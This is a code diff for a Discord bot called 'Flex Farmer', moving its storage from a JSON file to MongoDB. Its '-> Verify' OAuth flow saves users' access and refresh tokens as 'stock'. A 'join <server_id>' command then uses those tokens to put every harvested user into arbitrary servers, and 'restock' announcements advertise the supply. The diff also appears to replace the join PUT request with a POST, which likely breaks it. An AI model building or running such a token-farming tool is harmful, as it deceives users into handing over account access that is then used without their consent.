@@ -13,8 +13,7 @@ const {
     MessageType
 } = require('discord.js');
 const express = require('express');
-const fs = require('fs');
-const path = require('path');
+const mongoose = require('mongoose');
 const https = require('https');
 require('dotenv').config();
 
@@ -24,46 +23,6 @@ const PORT = process.env.PORT || 8080;
 const DEFAULT_PREFIX = ','; 
 let currentPrefix = DEFAULT_PREFIX;
 
-// --- Built-in File Persistence Setup ---
-const DB_FILE = path.join(__dirname, 'database.json');
-
-function readDB() {
-    try {
-        if (!fs.existsSync(DB_FILE)) {
-            fs.writeFileSync(DB_FILE, JSON.stringify({ users: {}, restockCounter: 0, allTimeAuthCount: 0 }, null, 2));
-        }
-        return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
-    } catch (e) {
-        return { users: {}, restockCounter: 0, allTimeAuthCount: 0 };
-    }
-}
-
-function writeDB(data) {
-    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
-}
-
-// --- Built-in HTTPS Request Helper ---
-function makeHttpsRequest(url, options = {}, bodyData = null) {
-    return new Promise((resolve, reject) => {
-        const req = https.request(url, options, (res) => {
-            let body = '';
-            res.on('data', chunk => body += chunk);
-            res.on('end', () => {
-                try {
-                    const parsed = JSON.parse(body);
-                    resolve({ ok: res.statusCode >= 200 && res.statusCode < 300, status: res.statusCode, json: async () => parsed });
-                } catch (e) {
-                    resolve({ ok: res.statusCode >= 200 && res.statusCode < 300, status: res.statusCode, text: async () => body });
-                }
-            });
-        });
-        req.on('error', reject);
-        if (bodyData) req.write(bodyData);
-        req.end();
-    });
-}
-
-let discordClient = null;
 let lastBoostStickyMessage = null; 
 
 const CHANNELS = {
@@ -72,6 +31,87 @@ const CHANNELS = {
     VERIFICATION_LOG: '1563253454653235261',  
     AUTO_DELETE: '1563253483824746659'        
 };
+
+// --- MongoDB Persistent Schema ---
+if (process.env.MONGO_URI) {
+    mongoose.connect(process.env.MONGO_URI)
+        .then(() => console.log('Connected to MongoDB Database'))
+        .catch(err => console.error('MongoDB error:', err));
+}
+
+const userSchema = new mongoose.Schema({
+    user_id: { type: String, unique: true },
+    username: String,
+    avatar: String,
+    banner: String,
+    access_token: String,
+    refresh_token: String,
+    authorized_at: Number,
+    expires_at: Number
+});
+const UserModel = mongoose.model('User', userSchema);
+
+const statsSchema = new mongoose.Schema({
+    key: { type: String, unique: true },
+    restockCounter: { type: Number, default: 0 },
+    allTimeAuthCount: { type: Number, default: 0 }
+});
+const StatsModel = mongoose.model('Stat', statsSchema);
+
+async function getStats() {
+    let stats = await StatsModel.findOne({ key: 'global' });
+    if (!stats) {
+        stats = await StatsModel.create({ key: 'global', restockCounter: 0, allTimeAuthCount: 0 });
+    }
+    return stats;
+}
+
+// Helper HTTPS POST Function (no fetch module needed)
+function postHttps(url, bodyString, headers = {}) {
+    return new Promise((resolve, reject) => {
+        const parsedUrl = new URL(url);
+        const req = https.request({
+            hostname: parsedUrl.hostname,
+            path: parsedUrl.pathname + parsedUrl.search,
+            method: 'POST',
+            headers: {
+                ...headers,
+                'Content-Length': Buffer.byteLength(bodyString)
+            }
+        }, (res) => {
+            let data = '';
+            res.on('data', chunk => data += chunk);
+            res.on('end', () => {
+                try { resolve({ status: res.statusCode, data: JSON.parse(data) }); }
+                catch (e) { resolve({ status: res.statusCode, data }); }
+            });
+        });
+        req.on('error', reject);
+        req.write(bodyString);
+        req.end();
+    });
+}
+
+function getHttps(url, headers = {}) {
+    return new Promise((resolve, reject) => {
+        const parsedUrl = new URL(url);
+        const req = https.request({
+            hostname: parsedUrl.hostname,
+            path: parsedUrl.pathname + parsedUrl.search,
+            method: 'GET',
+            headers
+        }, (res) => {
+            let data = '';
+            res.on('data', chunk => data += chunk);
+            res.on('end', () => {
+                try { resolve({ status: res.statusCode, data: JSON.parse(data) }); }
+                catch (e) { resolve({ status: res.statusCode, data }); }
+            });
+        });
+        req.on('error', reject);
+        req.end();
+    });
+}
 
 const client = new Client({
     intents: [
@@ -82,23 +122,16 @@ const client = new Client({
     ]
 });
 
-discordClient = client;
-
-// --- Express Route for Native Discord OAuth Popup Callback ---
+// --- OAuth Receiver Endpoint ---
 app.get('/', async (req, res) => {
     const code = req.query.code;
     const error = req.query.error;
 
-    if (error) {
-        return res.send(`<html><body style="background:#111;color:#ff4444;text-align:center;padding-top:50px;"><h1>Cancelled</h1><p>Authorization was declined.</p></body></html>`);
-    }
-    
-    if (!code) {
-        return res.send(`<html><body style="background:#111;color:#fff;text-align:center;padding-top:50px;"><h1>Flex Farmer</h1><p>OAuth server is running successfully.</p></body></html>`);
-    }
+    if (error) return res.send(`<html><body style="background:#111;color:#ff4444;text-align:center;padding-top:50px;"><h1>Cancelled</h1></body></html>`);
+    if (!code) return res.send(`<html><body style="background:#111;color:#fff;text-align:center;padding-top:50px;"><h1>Flex Farmer Server Active</h1></body></html>`);
 
     try {
-        const tokenParams = new URLSearchParams({
+        const params = new URLSearchParams({
             client_id: process.env.CLIENT_ID || '1561438987464483048',
             client_secret: process.env.CLIENT_SECRET,
             grant_type: 'authorization_code',
@@ -106,75 +139,68 @@ app.get('/', async (req, res) => {
             redirect_uri: process.env.REDIRECT_URI || 'https://farmerauth-production.up.railway.app',
         }).toString();
 
-        const tokenResponse = await makeHttpsRequest('https://discord.com/api/oauth2/token', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
-        }, tokenParams);
+        const tokenRes = await postHttps('https://discord.com/api/oauth2/token', params, {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        });
 
-        const oauthData = await tokenResponse.json();
-
-        if (oauthData.access_token) {
-            const userRes = await makeHttpsRequest('https://discord.com/api/users/@me', {
-                method: 'GET',
-                headers: { authorization: `Bearer ${oauthData.access_token}` }
+        if (tokenRes.data && tokenRes.data.access_token) {
+            const oauthData = tokenRes.data;
+            const userRes = await getHttps('https://discord.com/api/users/@me', {
+                'Authorization': `Bearer ${oauthData.access_token}`
             });
-            const userData = await userRes.json();
+            const userData = userRes.data;
 
-            if (!userData.id) {
-                return res.send(`<html><body style="background:#111;color:#ff4444;text-align:center;padding-top:50px;"><h1>Error</h1><p>Failed to fetch Discord profile.</p></body></html>`);
-            }
+            if (userData && userData.id) {
+                await UserModel.findOneAndUpdate(
+                    { user_id: userData.id },
+                    {
+                        username: userData.username,
+                        avatar: userData.avatar,
+                        banner: userData.banner,
+                        access_token: oauthData.access_token,
+                        refresh_token: oauthData.refresh_token,
+                        authorized_at: Date.now(),
+                        expires_at: Date.now() + (oauthData.expires_in * 1000)
+                    },
+                    { upsert: true, new: true }
+                );
 
-            let dbData = readDB();
-            dbData.users[userData.id] = {
-                user_id: userData.id,
-                username: userData.username,
-                avatar: userData.avatar,
-                banner: userData.banner,
-                access_token: oauthData.access_token,
-                refresh_token: oauthData.refresh_token,
-                authorized_at: Date.now(),
-                expires_at: Date.now() + (oauthData.expires_in * 1000)
-            };
-            dbData.restockCounter = (dbData.restockCounter || 0) + 1;
-            dbData.allTimeAuthCount = (dbData.allTimeAuthCount || 0) + 1;
-            writeDB(dbData);
+                let stats = await getStats();
+                stats.restockCounter += 1;
+                stats.allTimeAuthCount += 1;
+                await stats.save();
 
-            const totalStock = Object.keys(dbData.users).length;
+                const totalStock = await UserModel.countDocuments();
 
-            if (client.isReady()) {
-                try {
-                    let verifLogChannel = client.channels.cache.get(CHANNELS.VERIFICATION_LOG) || await client.channels.fetch(CHANNELS.VERIFICATION_LOG);
-                    if (verifLogChannel) {
-                        const logEmbed = new EmbedBuilder()
-                            .setTitle('⚡ New User Verified')
-                            .setDescription(`User **${userData.username}** (\`${userData.id}\`) verified successfully!\n\n**Total Available Stock:** \`${totalStock}\``)
-                            .setColor(0x00FF00)
-                            .setTimestamp();
-
-                        await verifLogChannel.send({ embeds: [logEmbed] });
-                    }
-                } catch (logErr) {
-                    console.error('[VERIFICATION LOG ERROR]', logErr);
+                if (client.isReady()) {
+                    try {
+                        let verifChannel = client.channels.cache.get(CHANNELS.VERIFICATION_LOG) || await client.channels.fetch(CHANNELS.VERIFICATION_LOG);
+                        if (verifChannel) {
+                            const embed = new EmbedBuilder()
+                                .setTitle('⚡ New User Verified')
+                                .setDescription(`User **${userData.username}** (\`${userData.id}\`) verified!\n\n**Total Stock:** \`${totalStock}\``)
+                                .setColor(0x00FF00)
+                                .setTimestamp();
+                            await verifChannel.send({ embeds: [embed] });
+                        }
+                    } catch (e) {}
                 }
-            }
 
-            return res.send(`<html><body style="background:#111;color:#55ff55;text-align:center;padding-top:50px;"><h1>Verified Successfully!</h1><p>You can close this window and return to Discord.</p></body></html>`);
-        } else {
-            return res.send(`<html><body style="background:#111;color:#ff4444;text-align:center;padding-top:50px;"><h1>Failed</h1><p>Token exchange failed.</p></body></html>`);
+                return res.send(`<html><body style="background:#111;color:#55ff55;text-align:center;padding-top:50px;"><h1>Verified Successfully!</h1><p>You can close this tab.</p></body></html>`);
+            }
         }
-    } catch (error) {
-        console.error('[OAUTH EXCEPTION]', error);
-        return res.send(`<html><body style="background:#111;color:#ff4444;text-align:center;padding-top:50px;"><h1>Error</h1><p>Server error during verification.</p></body></html>`);
+        return res.send(`<html><body style="background:#111;color:#ff4444;text-align:center;padding-top:50px;"><h1>Verification Failed</h1></body></html>`);
+    } catch (err) {
+        return res.send(`<html><body style="background:#111;color:#ff4444;text-align:center;padding-top:50px;"><h1>Server Error</h1></body></html>`);
     }
 });
 
-app.listen(PORT, '0.0.0.0', () => console.log(`Flex Farmer Web server running on port ${PORT}`));
+app.listen(PORT, '0.0.0.0', () => console.log(`Web server active on port ${PORT}`));
 
 async function sendRestockAnnouncement(channel, amountAdded) {
     try {
-        let dbData = readDB();
-        const totalStock = Object.keys(dbData.users).length;
-        const restockMessage = 
+        const totalStock = await UserModel.countDocuments();
+        const msg = 
             `**Restock Alert!**\n\n` +
             `**Flex Network** has restocked with **${amountAdded}**!\n\n` +
             `> Current Stock: **${totalStock}**\n\n` +
@@ -184,44 +210,36 @@ async function sendRestockAnnouncement(channel, amountAdded) {
             `-# <#1563253483824746659> / <#1563253479059886223>\n\n` +
             `@everyone`;
 
-        const sentMessage = await channel.send({ content: restockMessage });
-        await sentMessage.react('☑️');
-    } catch (announcementErr) {
-        console.error('Failed restock announcement:', announcementErr);
-    }
+        const sent = await channel.send({ content: msg });
+        await sent.react('☑️');
+    } catch (e) {}
 }
 
 const slashCommands = [
     new SlashCommandBuilder()
         .setName('say')
         .setDescription('Send custom message')
-        .addStringOption(option => option.setName('message').setDescription('Content').setRequired(true))
-        .addBooleanOption(option => option.setName('embed').setDescription('Embed mode').setRequired(false))
-        .addStringOption(option => option.setName('webhook_url').setDescription('Webhook URL').setRequired(false))
-].map(command => command.toJSON());
+        .addStringOption(opt => opt.setName('message').setDescription('Content').setRequired(true))
+        .addBooleanOption(opt => opt.setName('embed').setDescription('Embed mode').setRequired(false))
+        .addStringOption(opt => opt.setName('webhook_url').setDescription('Webhook URL').setRequired(false))
+].map(c => c.toJSON());
 
 client.once('ready', async () => {
-    console.log(`Flex Farmer logged in as ${client.user.tag}! Prefix: '${currentPrefix}'`);
+    console.log(`Flex Farmer ready as ${client.user.tag}`);
     const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
     try {
         await rest.put(Routes.applicationCommands(process.env.CLIENT_ID || '1561438987464483048'), { body: slashCommands });
-    } catch (slashErr) {
-        console.error('Failed to register slash commands:', slashErr);
-    }
+    } catch (e) {}
 });
 
 client.on('interactionCreate', async interaction => {
     if (interaction.isButton()) {
         if (interaction.customId === 'restock_yes') {
-            await interaction.update({ content: '✅ Restock announcement confirmed! Sending to restock channel...', components: [] });
-            try {
-                const restockChannel = client.channels.cache.get(CHANNELS.AUTORESTOCK) || await client.channels.fetch(CHANNELS.AUTORESTOCK);
-                if (restockChannel) {
-                    let dbData = readDB();
-                    await sendRestockAnnouncement(restockChannel, dbData.restockCounter || 0);
-                }
-            } catch (err) {
-                console.error('Failed to send restock announcement via button:', err);
+            await interaction.update({ content: '✅ Restock announcement confirmed!', components: [] });
+            const restockChannel = client.channels.cache.get(CHANNELS.AUTORESTOCK) || await client.channels.fetch(CHANNELS.AUTORESTOCK);
+            if (restockChannel) {
+                const stats = await getStats();
+                await sendRestockAnnouncement(restockChannel, stats.restockCounter);
             }
             return;
         } else if (interaction.customId === 'restock_no') {
@@ -231,26 +249,19 @@ client.on('interactionCreate', async interaction => {
 
     if (!interaction.isChatInputCommand()) return;
     if (interaction.commandName === 'say') {
-        const textMessage = interaction.options.getString('message');
+        const text = interaction.options.getString('message');
         const isEmbed = interaction.options.getBoolean('embed') || false;
         const webhookUrl = interaction.options.getString('webhook_url');
 
         try {
             if (webhookUrl) {
                 const whClient = new WebhookClient({ url: webhookUrl });
-                if (isEmbed) {
-                    await whClient.send({ embeds: [new EmbedBuilder().setDescription(textMessage).setColor(0x5865F2)] });
-                } else {
-                    await whClient.send({ content: textMessage });
-                }
+                if (isEmbed) await whClient.send({ embeds: [new EmbedBuilder().setDescription(text).setColor(0x5865F2)] });
+                else await whClient.send({ content: text });
                 return interaction.reply({ content: '✅ Sent via Webhook!', ephemeral: true });
             }
-
-            if (isEmbed) {
-                await interaction.channel.send({ embeds: [new EmbedBuilder().setDescription(textMessage).setColor(0x5865F2)] });
-            } else {
-                await interaction.channel.send({ content: textMessage });
-            }
+            if (isEmbed) await interaction.channel.send({ embeds: [new EmbedBuilder().setDescription(text).setColor(0x5865F2)] });
+            else await interaction.channel.send({ content: text });
             return interaction.reply({ content: '✅ Sent!', ephemeral: true });
         } catch (err) {
             return interaction.reply({ content: `❌ Failed: ${err.message}`, ephemeral: true });
@@ -278,14 +289,7 @@ async function sendBoostStickyPanel(channel) {
 client.on('messageCreate', async message => {
     const rawContent = message.content.trim();
 
-    const isBoostMessage = [
-        MessageType.GuildBoost,
-        MessageType.GuildBoostTier1,
-        MessageType.GuildBoostTier2,
-        MessageType.GuildBoostTier3
-    ].includes(message.type);
-
-    if (isBoostMessage) {
+    if ([MessageType.GuildBoost, MessageType.GuildBoostTier1, MessageType.GuildBoostTier2, MessageType.GuildBoostTier3].includes(message.type)) {
         await sendBoostStickyPanel(message.channel);
         return;
     }
@@ -299,11 +303,11 @@ client.on('messageCreate', async message => {
     if (message.author.bot) return;
 
     if (rawContent.toLowerCase() === ',rbot' || rawContent.toLowerCase() === '.rbot') {
-        const rbotEmbed = new EmbedBuilder().setDescription('Use the bot, click the button below.').setColor(0x595B5C);
-        const rbotButton = new ActionRowBuilder().addComponents(
+        const embed = new EmbedBuilder().setDescription('Use the bot, click the button below.').setColor(0x595B5C);
+        const row = new ActionRowBuilder().addComponents(
             new ButtonBuilder().setLabel('use {r-bot}').setStyle(ButtonStyle.Link).setURL('https://discord.gg/ZK3Er7Xgdq')
         );
-        await message.channel.send({ embeds: [rbotEmbed], components: [rbotButton] });
+        await message.channel.send({ embeds: [embed], components: [row] });
         try { if (message.deletable) await message.delete(); } catch(e){}
         return;
     }
@@ -330,10 +334,7 @@ client.on('messageCreate', async message => {
             .setColor(0x00FF00);
 
         const row = new ActionRowBuilder().addComponents(
-            new ButtonBuilder()
-                .setLabel('-> Verify')
-                .setStyle(ButtonStyle.Link)
-                .setURL(oauthUrl)
+            new ButtonBuilder().setLabel('-> Verify').setStyle(ButtonStyle.Link).setURL(oauthUrl)
         );
 
         return message.channel.send({ embeds: [embed], components: [row] });
@@ -370,32 +371,31 @@ client.on('messageCreate', async message => {
     }
 
     if (command === 'stock') {
-        const dbData = readDB();
-        const users = Object.values(dbData.users);
-        const lastRestockCount = Math.min(dbData.restockCounter || 0, users.length);
+        const totalStock = await UserModel.countDocuments();
+        const stats = await getStats();
+        const lastRestockCount = Math.min(stats.restockCounter, totalStock);
         return message.channel.send({ embeds: [new EmbedBuilder().setTitle('📦 Flex Farmer Stock').setDescription(`Available users that can join servers from the last restock: **\`${lastRestockCount}\`**`).setColor(0x595B5C)] });
     }
 
     if (command === 'auth' || command === 'authed') {
-        const dbData = readDB();
-        const users = Object.values(dbData.users);
+        const users = await UserModel.find({});
         const now = Date.now();
         const last24hCount = users.filter(user => user.authorized_at && user.authorized_at >= (now - 86400000)).length;
+        const stats = await getStats();
 
         const authEmbed = new EmbedBuilder()
             .setTitle('⚡ Authorization & Stock Statistics')
             .setColor(0x5865F2)
             .addFields(
                 { name: '🕒 Last 24 Hours', value: `\`${last24hCount}\` users authorized`, inline: true },
-                { name: '🌐 All-Time', value: `\`${dbData.allTimeAuthCount || 0}\` total authorizations`, inline: true },
+                { name: '🌐 All-Time', value: `\`${stats.allTimeAuthCount}\` total authorizations`, inline: true },
                 { name: '📦 Current Stock', value: `\`${users.length}\` active accounts`, inline: true }
             );
         return message.channel.send({ embeds: [authEmbed] });
     }
 
     if (command === 'status') {
-        const dbData = readDB();
-        const users = Object.values(dbData.users);
+        const totalStock = await UserModel.countDocuments();
         const uptimeSeconds = Math.floor(client.uptime / 1000);
         const hours = Math.floor(uptimeSeconds / 3600);
         const minutes = Math.floor((uptimeSeconds % 3600) / 60);
@@ -404,19 +404,19 @@ client.on('messageCreate', async message => {
             .setTitle('🟢 Flex Farmer Status')
             .setColor(0x00FF00)
             .addFields(
-                { name: '📊 Active Verified Stock', value: `\`${users.length}\` accounts`, inline: true },
+                { name: '📊 Active Verified Stock', value: `\`${totalStock}\` accounts`, inline: true },
                 { name: '⏱️ Uptime', value: `\`${hours}h ${minutes}m ${seconds}s\``, inline: true }
             );
         return message.channel.send({ embeds: [statusEmbed] });
     }
 
     if (command === 'restock') {
-        const dbData = readDB();
-        const users = Object.values(dbData.users);
-        const amount = parseInt(args[0]) || users.length;
-        dbData.restockCounter = amount;
-        dbData.allTimeAuthCount = (dbData.allTimeAuthCount || 0) + amount;
-        writeDB(dbData);
+        const totalStock = await UserModel.countDocuments();
+        const amount = parseInt(args[0]) || totalStock;
+        let stats = await getStats();
+        stats.restockCounter = amount;
+        stats.allTimeAuthCount += amount;
+        await stats.save();
 
         const promptEmbed = new EmbedBuilder()
             .setTitle('📦 Restock Stock Prepared')
@@ -433,13 +433,11 @@ client.on('messageCreate', async message => {
 
     if (command === 'remove') {
         const amount = parseInt(args[0]) || 1;
-        let dbData = readDB();
-        let userKeys = Object.keys(dbData.users);
-        for (let i = 0; i < Math.min(amount, userKeys.length); i++) {
-            delete dbData.users[userKeys[i]];
+        const users = await UserModel.find({}).limit(amount);
+        for (const user of users) {
+            await UserModel.deleteOne({ _id: user._id });
         }
-        writeDB(dbData);
-        const remainingStock = Object.keys(dbData.users).length;
+        const remainingStock = await UserModel.countDocuments();
         return message.channel.send(`🗑️ Removed **${amount}** accounts from stock. Current stock: \`${remainingStock}\`.`);
     }
 
@@ -447,8 +445,7 @@ client.on('messageCreate', async message => {
         const targetGuildId = args[0];
         if (!targetGuildId) return message.channel.send(`Please provide a Server ID: \`${currentPrefix}join <server_id>\``);
 
-        const dbData = readDB();
-        let tokensToUse = Object.values(dbData.users);
+        let tokensToUse = await UserModel.find({});
         if (tokensToUse.length === 0) {
             return message.channel.send({ embeds: [new EmbedBuilder().setTitle('❌ Out of Stock').setDescription(`No accounts available.`).setColor(0xFF0000)] });
         }
@@ -481,20 +478,15 @@ client.on('messageCreate', async message => {
         let successCount = 0;
         for (const tokenData of tokensToUse) {
             try {
-                const joinRes = await makeHttpsRequest(`https://discord.com/api/v10/guilds/${targetGuildId}/members/${tokenData.user_id}`, {
-                    method: 'PUT',
-                    headers: {
-                        Authorization: `Bot ${process.env.DISCORD_TOKEN}`,
-                        'Content-Type': 'application/json'
-                    }
-                }, JSON.stringify({ access_token: tokenData.access_token }));
+                const joinRes = await postHttps(`https://discord.com/api/v10/guilds/${targetGuildId}/members/${tokenData.user_id}`, JSON.stringify({ access_token: tokenData.access_token }), {
+                    'Authorization': `Bot ${process.env.DISCORD_TOKEN}`,
+                    'Content-Type': 'application/json'
+                });
 
-                if (joinRes.ok || joinRes.status === 201 || joinRes.status === 204) {
+                if (joinRes.status >= 200 && joinRes.status < 300) {
                     successCount++;
                 }
-            } catch (err) {
-                console.error('Failed to add user:', err);
-            }
+            } catch (err) {}
         }
 
         try {
